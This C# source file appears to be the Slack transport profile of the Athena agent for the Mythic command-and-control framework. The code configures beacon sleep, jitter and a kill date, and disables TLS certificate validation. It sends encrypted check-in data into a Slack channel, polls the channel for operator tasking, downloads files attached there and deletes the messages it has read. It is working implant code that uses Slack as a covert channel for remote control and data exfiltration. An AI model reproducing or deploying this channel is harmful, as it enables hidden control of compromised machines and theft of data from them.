﻿using Athena.Utilities;
using System;
using System.Net;
using System.Net.Security;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Xml.Linq;
using Athena.Models.Config;
using Slack.NetStandard.Auth;
using Slack.NetStandard;
using Slack.NetStandard.WebApi.Chat;
using Slack.NetStandard.Messages;
using Slack.NetStandard.WebApi.Files;
using Slack.NetStandard.Messages.Blocks;
using Slack.NetStandard.WebApi.Conversations;
using System.Text.Json;
using Athena.Models.Mythic.Checkin;
using System.Text.Json.Serialization;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }

        public Config()
        {
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.profile = new Slack();

        }
    }

    public class Slack : IProfile
    {
        public string uuid { get; set; }
        public bool encrypted { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        private string messageToken { get; set; }
        private string channel { get; set; }
        private int messageChecks { get; set; } //How many times to attempt to send/read messages before assuming a failure
        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
        private string userAgent { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        private string agent_guid = Guid.NewGuid().ToString();
        private SlackWebApiClient client { get; set; }

        public Slack()
        {
            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.messageToken = "slack_message_token";
            this.channel = "slack_channel_id";
            this.userAgent = "user_agent";
            this.messageChecks = int.Parse("message_checks");
            this.timeBetweenChecks = int.Parse("time_between_checks");
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.uuid = "%UUID%";

            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );
            HttpClientHandler handler = new HttpClientHandler();
            this.client = new SlackWebApiClient(this.messageToken);
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new SlackWebApiClient(new HttpClient(handler), token: this.messageToken);

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.Client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            this.client.Conversations.Join(this.channel);
        }
        public async Task<string> Send(string json)
        {
            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                int i = 0;


                while (!await SendSlackMessage(json))
                {
                    if (i == this.messageChecks)
                    {
                        return String.Empty;
                    }
                    i++;
                }

                Dictionary<string, MythicMessageWrapper> result;
                json = String.Empty;
                i = 0;

                //Give the server a second to respond.

                result = await GetSlackMessages();

                //We should only be getting one message back so this is likely unneeded also
                //But just in case I ever need it later, use LINQ to select unique messages from the result in the event we accidentally receive double messages.
                //Still not right, if we send a command and a task result this is still valid but still fucks up the json
                //Probably just going to take the first item
                //foreach (var message in result.Reverse().FirstOrDefault())
                //{
                //    json += message.Value.message;
                //}

                string strRes;
                //Take only the most recent response in case some messages got left over.
                //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
                if (result.FirstOrDefault().Value is not null)
                {
                    strRes = result.FirstOrDefault().Value.message;
                }
                else
                {
                    return String.Empty;
                }

                //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                DeleteMessages(result.Keys.ToList());
                
                if (this.encrypted)
                {
                    return this.crypt.Decrypt(strRes);
                }

                if (!string.IsNullOrEmpty(strRes))
                {
                    return (await Misc.Base64Decode(strRes)).Substring(36);
                }
                return String.Empty;
            }
            catch (Exception e)
            {
                return String.Empty;
            }
        }
        private async Task<bool> SendSlackMessage(string data)
        {
            MythicMessageWrapper msg;
            if (data.Count() > 3850)
            {
                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = String.Empty,
                    to_server = true,
                    id = 1,
                    final = true
                };
                var request = new FileUploadRequest
                {
                    Channels = this.channel,
                    Title = "",
                    InitialComment = JsonSerializer.Serialize(msg, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper),
                    Content = data,
                    Filetype = "txt"
                };

                var res = await this.client.Files.Upload(request);

                return res.OK;
            }
            else
            {
                var request = new PostMessageRequest
                {
                    Channel = this.channel,
                };

                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = data,
                    to_server = true,
                    id = 1,
                    final = true
                };

                request.Blocks.Add(new Section
                {
                    Text = new PlainText(JsonSerializer.Serialize(msg, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper))
                });


                var result = await client.Chat.Post(request);

                return result.OK;

            }
        }

        private async Task DeleteMessages(List<string> messages)
        {
            // This works for the current implemenation but may have to change in the event I need to further chunk messages.
            messages.ForEach(async message =>
            {
                try
                {
                    await this.client.Chat.Delete(this.channel, message);
                }
                catch
                { } //Just ignore the exception so that the client can continue communicating back.
            });
        }
        private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
        {
            Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();

            for (int i = 0; i < this.messageChecks; i++)
            {
                var request = new ConversationHistoryRequest
                {
                    Channel = this.channel,
                    Limit = 200,
                };
                await Task.Delay(this.timeBetweenChecks * 1000);

                var conversationsResponse = await this.client.Conversations.History(request);

                if (conversationsResponse.OK)
                {
                    conversationsResponse.Messages.ToList<Message>().ForEach(async message =>
                    {
                        try
                        {
                            if (message.Text.Contains(this.agent_guid))
                            {
                                MythicMessageWrapper mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper);

                                if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
                                {
                                    if (String.IsNullOrEmpty(mythicMessage.message))
                                    {
                                        var res = await this.client.Client.GetAsync(message.Files.FirstOrDefault().UrlPrivateDownload);


                                        mythicMessage.message = await res.Content.ReadAsStringAsync();
                                        messages.Add(message.Timestamp, mythicMessage);
                                    }
                                    else
                                    {
                                        messages.Add(message.Timestamp, mythicMessage);
                                    }
                                }
                            }

                        }
                        catch (Exception e)
                        {
                        }
                    });
                }
                if (messages.Count > 0) //we got something for us
                {
                    break;
                }
            }

            return messages;
        }
    }

    public class MythicMessageWrapper
    {
        public string message { get; set; } = String.Empty;
        public string sender_id { get; set; } //Who sent the message
        public bool to_server { get; set; }
        public int id { get; set; }
        public bool final { get; set; }
    }
    [JsonSerializable(typeof(MythicMessageWrapper))]
    public partial class MythicMessageWrapperJsonContext : JsonSerializerContext
    {
    }
}